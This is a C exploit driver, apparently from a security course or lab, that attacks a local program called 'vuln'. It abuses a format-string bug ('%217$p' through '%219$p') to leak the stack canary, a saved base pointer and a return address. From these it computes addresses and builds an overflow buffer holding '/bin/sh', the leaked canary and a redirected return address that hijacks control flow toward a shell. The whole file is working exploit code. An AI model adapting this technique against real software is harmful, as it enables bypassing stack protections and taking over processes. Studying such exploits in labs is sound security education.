#include <sys/wait.h>
#include "driver_base.h"
#include "constants.h"

int main(int argc, char* argv[]) {
    char *nargv[3] = { "vuln", STRINGIFY(GRP), NULL };
	
	// Fork subprocess vuln
	create_subproc("./vuln", nargv);
	fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
		"vuln, go ahead and do that now. Press 'enter' when you are ready\n"
		"to continue with the exploit\n");

	getchar();
	get_formatted("%*s"); // Needed to clear out the Welcome message


	// The probed value on the stack is 217 for the stack canary
	put_str("e %217$p\n");
	send();
	uint64_t canary;
	get_formatted("%p", &canary);
	fprintf(stderr, "driver: Extracted canary=%lx\n", canary);

	// The probed value on the stack is 218 for the saved rbp value in main loop
	put_str("e %218$p\n");
	send();
	uint64_t cur_main_bp;
	get_formatted("%p", &cur_main_bp);
	fprintf(stderr, "driver: Extracted cur_main_bp=%lx\n", cur_main_bp);

	// The probed value on the stack is 219 for the return address for main_loop
	put_str("e %219$p\n");
	send();
	uint64_t cur_main_return_addr;
	get_formatted("%p", &cur_main_return_addr);
	fprintf(stderr, "driver: Extracted cur_main_return_addr=%lx\n", cur_main_return_addr);

	// Now, compute the base pointer for the current run using the probed values
	uint64_t cur_g_bp		= cur_main_bp - g_main_bp_dist;
	uint64_t cur_auth_bp	= cur_main_bp - auth_main_bp_dist;
	uint64_t cur_phelper_addr	= cur_main_return_addr - private_helper_distance;
	uint64_t cur_cred		= cur_auth_bp - auth_bp_cred_dist;

	fprintf(stderr, "driver: Computed cur_g_bp=%lx\n", cur_g_bp);
	fprintf(stderr, "driver: Computed cur_auth_bp=%lx\n", cur_auth_bp);
	fprintf(stderr, "driver: Computed phelper_addr=%lx\n", cur_phelper_addr);
	fprintf(stderr, "driver: Computed cur_cred=%lx\n", cur_cred);


	// Send the payload
	put_str("p 1234567\n");
	send();
	get_formatted("%*s");


	// Allocate and prepare a buffer that contains the exploit string.
	unsigned explsz = g_bp_cred_dist - 8;  // -1 for "_" added by auth fn
	printf("Exploit size is: %d\n", explsz);
	void **expl = (void **)malloc(explsz);

	memset((void*)expl, '\0', explsz);

	// Now initialize the parts of the exploit buffer that really matter
	strcpy((char *)expl, "/bin/sh");
	expl[auth_bp_cred_dist/sizeof(void *)]	= cur_phelper_addr;
	expl[auth_bp_cred_dist/sizeof(void *) - 1]	= cur_g_bp;
	expl[auth_bp_cred_dist/sizeof(void *) - 2]	= canary;


	expl[g_bp_cred_dist/sizeof(void *) - 2] = 0x1234567000000000;
	expl[g_bp_cred_dist/sizeof(void *) - 3] = 0x123456789abcdef0;
	expl[g_bp_cred_dist/sizeof(void *) - 4] = cur_cred + sizeof(char *);

	put_str("u ");
	put_bin((char*)expl, explsz);
	put_str("\n");
	send();
	get_formatted("%*s");

	put_str("l \n");
	send();

	usleep(100000);
	get_formatted("%*s");

	kill(pid, SIGINT);
	int status;
	wait(&status);
	display_vuln_status(status);
}
